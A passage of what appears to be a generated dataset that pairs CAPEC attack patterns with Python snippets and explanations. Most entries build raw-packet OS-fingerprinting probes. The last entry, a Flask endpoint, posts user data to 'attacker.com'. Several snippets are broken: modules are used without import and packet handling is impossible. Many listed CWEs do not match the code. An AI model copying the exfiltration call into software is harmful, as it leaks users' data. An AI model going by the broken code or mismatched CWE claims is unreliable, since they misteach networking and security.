        "code_snippet": "import socket\nimport logging\n\n# CWE-532: Information Exposure Through Debug Log Files\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n# CWE-287: Authentication Bypass Issues\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef get_os_fingerprint(ip):\n    try:\n        # Simulate an IP fingerprinting probe\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, 80))\n        sock.send(b'HEAD / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n        response = sock.recv(1024)\n        sock.close()\n\n        # Log the response for debugging (CWE-532)\n        logging.debug(f'Response from {ip}: {response}')\n\n        # Simulate OS fingerprinting based on response\n        if b'Server: Apache' in response:\n            return 'Linux'\n        elif b'Server: Microsoft-IIS' in response:\n            return 'Windows'\n        else:\n            return 'Unknown'\n    except Exception as e:\n        logging.error(f'Error connecting to {ip}: {e}')\n        return 'Error'\n\n# Example usage\nip_address = '192.168.1.1'\nos_fingerprint = get_os_fingerprint(ip_address)\nprint(f'The OS fingerprint for {ip_address} is: {os_fingerprint}')",
        "description": "This Python code snippet demonstrates a basic example of IP fingerprinting, which is related to the deprecated CAPEC-312: Active OS Fingerprinting. The code attempts to connect to a given IP address and send an HTTP request to determine the operating system based on the server's response. It logs the response for debugging purposes, which can expose sensitive information (CWE-532). The code also highlights potential issues such as authentication bypass (CWE-287) and reliance on DNS lookups (CWE-350). Additionally, it touches on the improper management of sensitive data (CWE-1323) by logging potentially sensitive trace data."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\n\n# Vulnerable function to perform OS fingerprinting\n# This function sends a TCP packet and analyzes the response to determine the OS\n# It also logs debug information which can expose sensitive data\n\ndef os_fingerprinting(target_ip):\n    try:\n        # Create a raw socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        s.settimeout(1)\n\n        # Send a TCP packet to the target\n        s.sendto(b'\\x00' * 40, (target_ip, 80))\n\n        # Receive the response\n        response = s.recvfrom(1024)\n\n        # Log the response for debugging (vulnerable to information exposure)\n        with open('debug.log', 'a') as log_file:\n            log_file.write(f'Response from {target_ip}: {response}\\n')\n\n        # Analyze the response to determine the OS (simplified example)\n        if b'Linux' in response[0]:\n            return 'Linux'\n        elif b'Windows' in response[0]:\n            return 'Windows'\n        else:\n            return 'Unknown'\n    except Exception as e:\n        print(f'Error: {e}')\n        return 'Error'\n\n# Example usage\nprint(os_fingerprinting('192.168.1.1'))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of TCP/IP fingerprinting, which is used to determine the operating system of a target machine by sending a TCP packet and analyzing the response. The code creates a raw socket, sends a TCP packet to the target IP, and logs the response to a debug file. This logging can expose sensitive information, making it vulnerable to information exposure (CWE-532). Additionally, the code does not handle authentication, making it susceptible to capture-replay attacks (CWE-294). The function also relies on specific network behavior that may not be consistent across different platforms, potentially leading to issues related to non-ubiquitous API calls (CWE-589)."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import os\nimport socket\n\n# Vulnerable function to determine OS type using ICMP fingerprinting\n# This is a deprecated method and should not be used\n\ndef icmp_fingerprinting(target_ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n\n        # Send an ICMP echo request\n        icmp_packet = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # Type 8 (Echo), Code 0\n        sock.sendto(icmp_packet, (target_ip, 0))\n\n        # Receive the ICMP echo reply\n        response, _ = sock.recvfrom(1024)\n\n        # Simple fingerprinting based on response length (not reliable)\n        if len(response) > 20:\n            return \"Likely a Unix-based OS\"\n        else:\n            return \"Likely a Windows-based OS\"\n    except Exception as e:\n        return f\"Error: {e}\"\n\n# Example usage\nprint(icmp_fingerprinting('192.168.1.1'))\n\n# Note: This code is for educational purposes and should not be used in production.\n# It demonstrates deprecated ICMP fingerprinting and related issues.\n# CWE-287: Authentication Bypass Issues\n# CWE-532: Information Exposure Through Debug Log Files\n# CWE-350: Reliance on DNS Lookups in a Security Decision",
        "description": "This Python code snippet demonstrates a deprecated method of determining the operating system type of a target machine using ICMP fingerprinting. The function `icmp_fingerprinting` sends an ICMP echo request to the target IP and attempts to infer the OS type based on the response length. This method is unreliable and deprecated. The code also highlights related security issues such as CWE-287 (Authentication Bypass Issues), CWE-532 (Information Exposure Through Debug Log Files), and CWE-350 (Reliance on DNS Lookups in a Security Decision). The code is for educational purposes and should not be used in production."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import socket\nimport time\n\ndef analyze_ip_id_sequence(target_ip):\n    ip_ids = []\n    for _ in range(5):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (target_ip, 0))\n        response = sock.recv(1024)\n        ip_id = int.from_bytes(response[4:6], byteorder='big')\n        ip_ids.append(ip_id)\n        time.sleep(1)\n    return ip_ids\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    ip_id_sequence = analyze_ip_id_sequence(target_ip)\n    print(f'IP ID sequence for {target_ip}: {ip_id_sequence}')",
        "description": "This Python code snippet demonstrates a basic implementation of an IP ID sequencing probe, which is used for OS fingerprinting by analyzing the IP 'ID' field sequence number generation algorithm of a remote host. The code sends ICMP echo requests to the target IP address and captures the IP ID values from the responses. By examining the sequence of these IP ID values, an attacker can infer the operating system of the target host. This technique leverages the fact that different operating systems generate IP ID numbers differently. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP ID sequence, which can be considered sensitive information. Additionally, it indirectly relates to CWE-291 (Reliance on IP Address for Authentication) as it involves network communication based on IP addresses."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with a specific IP ID\ndef send_udp_probe(target_ip, target_port, ip_id):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    packet = b'\\x45\\x00\\x00\\x1c' + ip_id.to_bytes(2, 'big') + b'\\x00\\x00\\x40\\x11\\x00\\x00' + socket.inet_aton('192.168.1.1') + socket.inet_aton(target_ip) + b'\\x00\\x00\\x00\\x00' + b'\\x00' * 8\n    sock.sendto(packet, (target_ip, target_port))\n\n# Function to receive ICMP error message\ndef receive_icmp_response():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    response, _ = sock.recvfrom(1024)\n    return response\n\n# Main function to perform the IP 'ID' Echoed Byte-Order Probe\ndef ip_id_echo_probe(target_ip, target_port, ip_id):\n    send_udp_probe(target_ip, target_port, ip_id)\n    response = receive_icmp_response()\n    echoed_ip_id = response[24:26]\n    if echoed_ip_id == ip_id.to_bytes(2, 'big'):\n        print(f\"IP ID {ip_id} echoed back correctly.\")\n    else:\n        print(f\"IP ID {ip_id} not echoed back correctly. Echoed: {int.from_bytes(echoed_ip_id, 'big')}\")\n\n# Example usage\nip_id_echo_probe('192.168.1.100', 12345, 54321)",
        "description": "This Python code snippet demonstrates an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP packet with a specific IP ID to a closed port on a target host and then listens for an ICMP error message. The IP ID from the ICMP response is checked to see if it matches the original IP ID, indicating how the target system handles the IP ID field. This can reveal information about the target's operating system or router firmware. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and handling identifiers improperly (CWE-1192, CWE-1290, CWE-1302, CWE-1323)."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with the DF bit set\ndef send_udp_packet_with_df(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header with DF bit set\n        ip_header = b'\\x45\\x00\\x00\\x1c\\x00\\x01\\x40\\x00\\x40\\x11\\x72\\xb7'  # Version, IHL, Type of Service, Total Length, ID, Flags (DF set), Fragment Offset, TTL, Protocol, Header Checksum\n        ip_header += socket.inet_aton('192.168.1.1')  # Source IP\n        ip_header += socket.inet_aton(target_ip)  # Destination IP\n\n        # Construct UDP header\n        udp_header = b'\\x00\\x35'  # Source Port\n        udp_header += target_port.to_bytes(2, 'big')  # Destination Port\n        udp_header += b'\\x00\\x08'  # Length\n        udp_header += b'\\x00\\x00'  # Checksum\n\n        # Send the packet\n        sock.sendto(ip_header + udp_header, (target_ip, target_port))\n        print(f\"Packet sent to {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nsend_udp_packet_with_df('192.168.1.2', 12345)",
        "description": "This Python code snippet demonstrates how to send a UDP packet with the 'Don't Fragment' (DF) bit set in the IP header to a specified target IP and port. The code creates a raw socket, constructs an IP header with the DF bit set, and sends the packet to the target. This mimics the behavior described in the CAPEC, where an attacker sends a UDP datagram with the DF bit set to observe the response from the target system. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and incorrectly specified destinations (CWE-941), which can be exploited through such probes."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a raw socket and send a TCP packet\ndef send_tcp_packet(dst_ip, dst_port):\n    try:\n        # Create a raw socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # IP header fields\n        ip_header = struct.pack('!BBHHHBBH4s4s',\n                                69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                                socket.inet_aton('192.168.1.100'),\n                                socket.inet_aton(dst_ip))\n\n        # TCP header fields\n        tcp_header = struct.pack('!HHLLBBHHH',\n                                 12345, dst_port, 0, 0, 80, 2, 8192, 0, 0)\n\n        # TCP options (Timestamp)\n        tcp_options = struct.pack('!BBLL', 8, 10, 0, 0)\n\n        # Final packet\n        packet = ip_header + tcp_header + tcp_options\n\n        # Send the packet\n        s.sendto(packet, (dst_ip, 0))\n        print(f'Packet sent to {dst_ip}:{dst_port}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nsend_tcp_packet('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates how to create and send a raw TCP packet with a timestamp option to a specified destination IP and port. The code constructs both the IP and TCP headers manually, including the TCP timestamp option, and sends the packet using a raw socket. This embodies the main idea of the CAPEC 'TCP Timestamp Probe' by showing how an attacker might craft and send a TCP packet to probe a remote server's TCP timestamp implementation. The related CWEs are represented in the context of potential vulnerabilities such as exposure of sensitive information (CWE-200) through observable timing discrepancies (CWE-208) and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport time\n\n# Function to generate a predictable sequence number\n# CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\ndef generate_sequence_number(seed):\n    return (seed * 1103515245 + 12345) & 0x7fffffff\n\n# Create a TCP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to the target server\nserver_address = ('localhost', 10000)\nsock.connect(server_address)\n\ntry:\n    # Send a probe packet\n    message = b'Test Probe'\n    sock.sendall(message)\n\n    # Receive the response\n    data = sock.recv(1024)\n    print(f'Received: {data}')\n\n    # Generate a sequence number based on a predictable seed (e.g., current time)\n    seed = int(time.time())\n    sequence_number = generate_sequence_number(seed)\n    print(f'Generated Sequence Number: {sequence_number}')\n\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    # Send the sequence number back to the server in cleartext\n    sock.sendall(str(sequence_number).encode())\n\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a TCP Sequence Number Probe, which is used for OS fingerprinting by analyzing the target system's TCP sequence number generation. The code connects to a target server, sends a probe packet, and receives a response. It then generates a predictable sequence number using a simple PRNG with a predictable seed (current time), illustrating CWE-337. The generated sequence number is sent back to the server in cleartext, highlighting CWE-319. This code embodies the main idea of the CAPEC by showing how sequence numbers can be probed and potentially predicted, which can expose sensitive information about the target system's OS."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to create a raw socket and send TCP SYN packets\ndef send_syn_packets(target_ip, target_port, count=10):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    for _ in range(count):\n        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0, socket.inet_aton('0.0.0.0'), socket.inet_aton(target_ip))\n        tcp_header = struct.pack('!HHLLBBHHH', 1234, target_port, 0, 0, 80, 2, 8192, 0, 0)\n        packet = ip_header + tcp_header\n        sock.sendto(packet, (target_ip, 0))\n        time.sleep(1)\n\n# Function to capture SYN/ACK responses and analyze ISNs\ndef capture_synack_responses(target_ip, target_port, count=10):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.bind((target_ip, target_port))\n    isn_list = []\n    for _ in range(count):\n        packet, _ = sock.recvfrom(65535)\n        ip_header = packet[0:20]\n        tcp_header = packet[20:40]\n        isn = struct.unpack('!L', tcp_header[4:8])[0]\n        isn_list.append(isn)\n    return isn_list\n\n# Main function to perform OS fingerprinting\ndef os_fingerprinting(target_ip, target_port):\n    send_syn_packets(target_ip, target_port)\n    isn_list = capture_synack_responses(target_ip, target_port)\n    gcd = isn_list[0]\n    for isn in isn_list[1:]:\n        gcd = math.gcd(gcd, isn)\n    print(f\"GCD of ISNs: {gcd}\")\n    # Compare GCD with known OS behaviors (not implemented)\n\n# Example usage\nos_fingerprinting('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a simplified version of the TCP (ISN) Greatest Common Divisor Probe, which is used for OS fingerprinting. The code sends multiple TCP SYN packets to a target IP and port, captures the SYN/ACK responses, and extracts the Initial Sequence Numbers (ISNs) from these responses. It then calculates the Greatest Common Divisor (GCD) of the ISNs, which can be used to infer the operating system of the target machine. The code highlights vulnerabilities such as exposure of sensitive system information (CWE-497) and cleartext transmission of sensitive data (CWE-319), as the ISNs are transmitted and analyzed without encryption or proper authorization checks."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport random\n\nclass TCPISNProbe:\n    def __init__(self):\n        self.isn = random.randint(0, 2**32 - 1)\n        self.last_time = time.time()\n\n    def get_isn(self):\n        current_time = time.time()\n        time_diff = current_time - self.last_time\n        self.isn += int(time_diff * 1000)  # Simulate time-based increment\n        self.last_time = current_time\n        return self.isn\n\n# Simulate probing the ISN over time\nprobe = TCPISNProbe()\nfor _ in range(10):\n    time.sleep(random.uniform(0.1, 0.5))  # Random sleep to simulate time passing\n    isn = probe.get_isn()\n    print(f\"Captured ISN: {isn}\")",
        "description": "This Python code snippet simulates a TCP Initial Sequence Number (ISN) generation process that increments based on time, embodying the main idea of the 'TCP (ISN) Counter Rate Probe' CAPEC. The `TCPISNProbe` class initializes an ISN and updates it based on the elapsed time since the last update, simulating a time-based increment algorithm. The `get_isn` method captures the current time, calculates the time difference from the last update, increments the ISN accordingly, and returns the new ISN. The loop at the end simulates probing the ISN over time by capturing and printing the ISN at random intervals. This demonstrates how an attacker could measure the rate of ISN increments to infer information about the operating system, relating to CWE-200 (Exposure of Sensitive Information) and CWE-385 (Covert Timing Channel)."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import time\nimport random\n\n# Predictable seed based on system time\nseed = int(time.time())\nrandom.seed(seed)\n\n# Generate a sequence number\nsequence_number = random.randint(0, 2**32 - 1)\n\nprint(f\"Generated sequence number: {sequence_number}\")",
        "description": "This Python code snippet demonstrates the vulnerability described in the CAPEC entry 'TCP (ISN) Sequence Predictability Probe'. The code initializes a pseudo-random number generator (PRNG) with a predictable seed based on the current system time (CWE-337). This makes the generated sequence number predictable (CWE-341). An attacker could observe the system time and predict the sequence number, potentially leading to security breaches. The code highlights the risk of using predictable seeds in PRNGs, which can expose sensitive information (CWE-200) and compromise the integrity of the system."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with ECN flags set\nip_header = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # Simplified IP header\nsrc_ip = '192.168.1.100'\ndst_ip = '192.168.1.1'\ntcp_header = b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x71\\x10\\x00\\x00\\x00\\x00'  # Simplified TCP header with ECN flags\n\n# Send the packet\nsock.sendto(ip_header + tcp_header, (dst_ip, 0))\n\n# Receive the response\nresponse = sock.recv(1024)\n\n# Check for ECN support in the response\nif response[33] & 0x03:  # Check ECN flags in the TCP header\n    print('ECN supported')\nelse:\n    print('ECN not supported')",
        "description": "This Python code snippet demonstrates a basic TCP Congestion Control Flag (ECN) probe. It creates a raw socket to send a TCP packet with ECN flags set to a target IP address. The code then listens for a response to determine if the target host supports ECN messaging. This probe can be used for OS fingerprinting based on the target's response to ECN flags. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), improper protection for outbound error messages (CWE-1320), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\n\n# Function to establish a TCP connection and check the initial window size\ndef check_initial_window_size(target_ip, target_port):\n    try:\n        # Create a TCP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_ip, target_port))\n\n        # Send a SYN packet to initiate the connection\n        sock.send(b'SYN')\n\n        # Receive the SYN-ACK response\n        response = sock.recv(1024)\n\n        # Extract the initial window size from the response\n        initial_window_size = response[14:16]  # Simplified extraction for demonstration\n        print(f\"Initial Window Size: {int.from_bytes(initial_window_size, 'big')}\")\n\n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\ncheck_initial_window_size('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates how to establish a TCP connection to a target IP and port, send a SYN packet, and receive a SYN-ACK response to check the initial TCP window size. The initial window size is extracted from the response, which can be used for OS fingerprinting. The code embodies the main idea of the CAPEC by probing the initial TCP window size to gather information about the target system. The related CWEs provide context for potential vulnerabilities, such as exposure of sensitive information (CWE-200) and reliance on data/memory layout (CWE-188), which could be exploited during this process."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to a specific interface and port\nsock.bind(('0.0.0.0', 0))\n\n# Enable IP_HDRINCL to include IP headers\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n# Function to parse TCP options\ndef parse_tcp_options(tcp_header):\n    options = []\n    offset = 20  # TCP header is 20 bytes\n    while offset < len(tcp_header):\n        kind = tcp_header[offset]\n        if kind == 0:  # End of options\n            break\n        elif kind == 1:  # No-Operation\n            offset += 1\n            continue\n        length = tcp_header[offset + 1]\n        options.append(tcp_header[offset:offset + length])\n        offset += length\n    return options\n\n# Function to fingerprint OS based on TCP options\ndef fingerprint_os(tcp_options):\n    if tcp_options == [b'\\x02\\x04\\x05\\xb4', b'\\x01', b'\\x03\\x03\\x08', b'\\x01', b'\\x01', b'\\x04\\x02']:\n        return 'Linux'\n    elif tcp_options == [b'\\x02\\x04\\x05\\xb4', b'\\x01', b'\\x01', b'\\x08\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00', b'\\x04\\x02']:\n        return 'Windows'\n    else:\n        return 'Unknown'\n\n# Receive a packet\npacket, addr = sock.recvfrom(65535)\n\n# Extract the TCP header\nip_header = packet[:20]\nip_header_length = (ip_header[0] & 0x0F) * 4\ntcp_header = packet[ip_header_length:ip_header_length + 20]\n\n# Parse TCP options\ntcp_options = parse_tcp_options(tcp_header)\n\n# Fingerprint the OS\nos_type = fingerprint_os(tcp_options)\nprint(f'OS Fingerprinted: {os_type}')",
        "description": "This Python code snippet demonstrates a TCP Options Probe, which is used for OS fingerprinting by analyzing the type and order of TCP header options in a response segment. The code creates a raw socket to capture TCP packets, parses the TCP options, and attempts to identify the operating system based on the unique ordering and option sets. This embodies the main idea of the CAPEC by leveraging the differences in TCP option handling across different OS implementations. The code also touches on related CWEs, such as exposure of sensitive information (CWE-200) and reliance on data/memory layout (CWE-188), by making assumptions about the structure of TCP options and potentially exposing OS information to unauthorized actors."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with RST flag and a text payload\nsrc_ip = '192.168.1.2'\ndst_ip = '192.168.1.1'\nsrc_port = 12345\ndst_port = 80\nseq = 0\nack_seq = 0\noffset_res = (5 << 4) | 0\nflags = 0x04  # RST flag\nwindow = socket.htons(5840)\nchecksum = 0\nurg_ptr = 0\n\n# TCP header fields\ntcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, checksum, urg_ptr)\n\n# Text payload\npayload = b'Connection reset by peer'\n\n# Calculate checksum (for simplicity, we set it to 0)\nchecksum = 0\n\n# Final packet\npacket = tcp_header + payload\n\n# Send the packet\nsock.sendto(packet, (dst_ip, 0))",
        "description": "This Python code snippet demonstrates the creation and sending of a TCP packet with the RST (reset) flag set, including a human-readable text payload. The code uses a raw socket to construct and send the packet, which is a common technique for OS fingerprinting probes as described in the CAPEC. The packet includes a text message in the payload, which some operating systems may include in RST packets when specific connection errors occur. This can expose sensitive information (CWE-200) and is transmitted in cleartext (CWE-319). The code does not include proper checksum validation (CWE-354) or integrity checks (CWE-353), making it vulnerable to data modification or corruption during transmission. Additionally, the lack of authentication mechanisms could allow for capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a specified host and port\ndef send_udp_packet(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'Test Message'\n    sock.sendto(message, (host, port))\n    sock.close()\n\n# Function to listen for ICMP error messages\ndef listen_for_icmp():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    sock.bind(('0.0.0.0', 0))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received ICMP error message from {addr}: {data}')\n\n# Example usage\nif __name__ == '__main__':\n    target_host = '192.168.1.1'\n    target_port = 12345\n    send_udp_packet(target_host, target_port)\n    listen_for_icmp()",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP Error Message Quoting Probe' attack. The code sends a UDP packet to a specified host and port, which may trigger an ICMP error message (e.g., Port Unreachable) from the target. The code then listens for incoming ICMP error messages, which may contain quoted data from the original UDP packet. This can expose sensitive information, aligning with CWE-200, CWE-211, and CWE-209. The code highlights how an adversary might probe a target to gather information through ICMP error messages."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\n\n# Function to send an ICMP Echo Request\ndef send_icmp_echo_request(target_ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n        # ICMP Echo Request packet\n        packet = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00' + b'Hello, World!'\n        sock.sendto(packet, (target_ip, 1))\n        # Receive the ICMP Error message\n        data, addr = sock.recvfrom(1024)\n        print(f'Received data from {addr}: {data}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Target IP address\ntarget_ip = '192.168.1.1'\nsend_icmp_echo_request(target_ip)",
        "description": "This Python code snippet demonstrates the concept of generating an ICMP Echo Request to a target IP address and then receiving and printing the ICMP Error message. The code creates a raw socket to send an ICMP Echo Request packet containing the string 'Hello, World!'. It then waits to receive an ICMP Error message from the target. The received data, which may contain sensitive information, is printed to the console. This snippet embodies the CAPEC idea of using ICMP Error messages to probe the integrity of data returned from the originating request. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-211) and lack of integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\nip_header += b'\\x40\\x01\\x00\\x00'  # TTL, Protocol | Header Checksum\nip_header += b'\\x7f\\x00\\x00\\x01'  # Source IP Address\nip_header += b'\\x7f\\x00\\x00\\x01'  # Destination IP Address\n\n# ICMP header fields\nicmp_header = b'\\x08\\x00\\x4d\\x62'  # Type, Code | Checksum\nicmp_header += b'\\x00\\x01\\x00\\x01'  # Identifier, Sequence Number\n\n# Construct the packet\npacket = ip_header + icmp_header\n\n# Send the packet to a closed port\nsock.sendto(packet, ('127.0.0.1', 0))\n\n# Receive the response\nresponse, _ = sock.recvfrom(1024)\n\n# Extract the IP total length field from the response\nip_total_length = response[2:4]\n\nprint(f'Received IP Total Length: {int.from_bytes(ip_total_length, byteorder=\"big\")}')",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP IP Total Length Field Probe' attack. It creates a raw socket to send a crafted ICMP packet to a closed port on the target machine (localhost in this case). The packet includes an IP header and an ICMP header. When the target machine responds with a 'Port Unreachable' error message, the code captures the response and extracts the IP total length field from the IP header of the response. This field can be used to infer information about the target's operating system. The code also highlights CWE-204 (Observable Response Discrepancy) by showing how different responses can reveal internal state information, and CWE-130 (Improper Handling of Length Parameter Inconsistency) by manipulating the length fields in the headers."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n\n# Set the IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service, Total Length\nip_header += b'\\x1c\\x46'  # Identification (ID) field\nip_header += b'\\x40\\x00\\x40\\x11\\x00\\x00'  # Flags, Fragment Offset, TTL, Protocol, Header Checksum\nip_header += socket.inet_aton('192.168.1.1')  # Source IP\nip_header += socket.inet_aton('192.168.1.2')  # Destination IP\n\n# Set the UDP header fields\nudp_header = b'\\x00\\x35\\x00\\x35'  # Source Port, Destination Port\nudp_header += b'\\x00\\x08\\x00\\x00'  # Length, Checksum\n\n# Combine headers to form the packet\npacket = ip_header + udp_header\n\n# Send the packet to a closed port\nsock.sendto(packet, ('192.168.1.2', 0))\n\n# Receive the ICMP error message\nresponse = sock.recv(1024)\n\n# Print the response for analysis\nprint(response)",
        "description": "This Python code snippet demonstrates the concept of the CAPEC 'ICMP IP 'ID' Field Error Message Probe'. It creates a raw socket and constructs a UDP packet with a specific IP identification field. The packet is sent to a closed port on a target machine. The code then listens for an ICMP error message in response. By analyzing the response, an attacker can fingerprint the target OS based on how the IP ID field is echoed back. This code also touches on related CWEs such as 'Observable Response Discrepancy' (CWE-204) and 'Externally-Generated Error Message Containing Sensitive Information' (CWE-211) by exploiting the differences in error message handling and the information contained within those messages."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated event hosting endpoint\n@app.route('/host_event', methods=['POST'])\ndef host_event():\n    event_data = request.json\n    # Log user information in cleartext (CWE-319)\n    with open('user_data.txt', 'a') as f:\n        f.write(f\"UserID: {event_data['user_id']}, Username: {event_data['username']}\\n\")\n    return jsonify({'status': 'Event hosted successfully'})\n\n# Simulated event participation endpoint\n@app.route('/join_event', methods=['POST'])\ndef join_event():\n    user_data = request.json\n    # Transmit sensitive data in cleartext (CWE-319)\n    response = requests.post('http://attacker.com/log', json=user_data)\n    return jsonify({'status': 'Joined event successfully'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
